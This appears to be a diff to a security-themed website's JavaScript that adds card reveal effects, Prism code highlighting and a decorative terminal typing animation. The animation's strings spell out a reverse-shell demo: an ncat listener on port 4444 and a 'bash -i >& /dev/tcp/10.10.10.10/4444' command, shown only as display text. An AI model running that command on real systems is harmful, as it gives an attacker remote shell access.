@@ -34,33 +34,34 @@
 
 
 
-// Robust terminal typing animation v2 (no "undefined", full lines)
+
+
+// Stagger reveal for cards
+(function(){
+  const cards = Array.from(document.querySelectorAll('.grid .card'));
+  if(!cards.length) return;
+  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*70)+'ms'; });
+})();
+
+
+// Terminal typing animation v3 (colored prompts, proper newlines, no duplicates)
 (function(){
   const A = document.querySelector('[data-ty="a"]');
   const B = document.querySelector('[data-ty="b"]');
   if(!A || !B) return;
 
-  const seqA = [
-    "attacker@razor$ ncat -lvnp 4444",
-    "listening on [any] 4444 ...",
-    "connection received from 10.10.10.42"
-  ];
-  const seqB = [
-    "victim@host$ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
-    "victim@host$ whoami",
-    "www-data"
-  ];
+  const seqA = ["ncat -lvnp 4444", "listening on [any] 4444 ...", "connection received from 10.10.10.42"];
+  const seqB = ["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", "whoami", "www-data"];
 
   function typeLine(el, text, delay){
     return new Promise(resolve=>{
       let i = 0;
       function step(){
         if(i < text.length){
-          el.textContent += text[i];
-          i++;
+          el.textContent += text[i++];
           setTimeout(step, delay);
         }else{
-          el.textContent += "\\n";
+          el.textContent += "\n";
           resolve();
         }
       }
@@ -70,27 +71,38 @@
 
   async function runOnce(){
     A.textContent = ""; B.textContent = "";
-    for (let i=0;i<Math.max(seqA.length, seqB.length);i++){
-      if(seqA[i]) await typeLine(A, seqA[i], 28);
-      if(seqB[i]) await typeLine(B, seqB[i], 28);
+    for (let i=0; i<Math.max(seqA.length, seqB.length); i++){
+      if(seqA[i]) await typeLine(A, seqA[i], 24);
+      if(seqB[i]) await typeLine(B, seqB[i], 24);
     }
   }
 
   const grid = document.querySelector('.term-grid');
-  if(!grid){ runOnce(); return; }
   let played = false;
   const io = new IntersectionObserver((entries)=>{
-    entries.forEach(e=>{
-      if(e.isIntersecting && !played){ played = true; runOnce(); }
-    });
-  }, {threshold:.15});
-  io.observe(grid);
+    entries.forEach(e=>{ if(e.isIntersecting && !played){ played = true; runOnce(); } });
+  }, {threshold:.12});
+  if(grid) io.observe(grid); else runOnce();
 })();
 
 
-// Stagger reveal for cards
+// Convert Rouge blocks to Prism-compatible and trigger highlighting
 (function(){
-  const cards = Array.from(document.querySelectorAll('.grid .card'));
-  if(!cards.length) return;
-  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*70)+'ms'; });
+  function convertRouge(){
+    document.querySelectorAll('div.highlighter-rouge').forEach(wrapper=>{
+      const code = wrapper.querySelector('pre.highlight > code');
+      if(!code) return;
+      const lang = (Array.from(code.classList).find(c=>c.startsWith('language-'))||'').replace('language-','') || 'clike';
+      const pre = document.createElement('pre');
+      const inner = document.createElement('code');
+      pre.className = 'language-' + lang;
+      inner.className = 'language-' + lang;
+      inner.textContent = code.textContent;
+      pre.appendChild(inner);
+      wrapper.replaceWith(pre);
+    });
+    if(window.Prism && Prism.highlightAll) Prism.highlightAll();
+  }
+  if(document.readyState !== 'loading') convertRouge();
+  else document.addEventListener('DOMContentLoaded', convertRouge);
 })();
